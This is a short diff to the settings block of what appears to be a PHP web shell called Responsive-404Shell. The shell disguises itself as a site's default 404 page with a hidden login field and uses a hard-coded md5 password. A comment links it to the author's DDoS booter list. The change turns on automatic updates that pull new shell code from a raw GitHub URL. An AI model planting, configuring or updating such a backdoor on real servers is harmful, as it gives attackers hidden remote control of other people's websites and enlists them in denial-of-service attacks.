@@ -2,9 +2,9 @@
 $pass               = md5("pw");
 $version            = 3.71;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
-$checkforupdates    = false;
+$checkforupdates    = true;
 $helpsupportbooter  = false; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
-$checkforupdatesurl = "";
+$checkforupdatesurl = "https://raw.githubusercontent.com/codelyfe/Responsive-404Shell/master/404sx.php";
 $mtime     = explode(' ', microtime());
 $starttime = $mtime[1] + $mtime[0];
 ?>
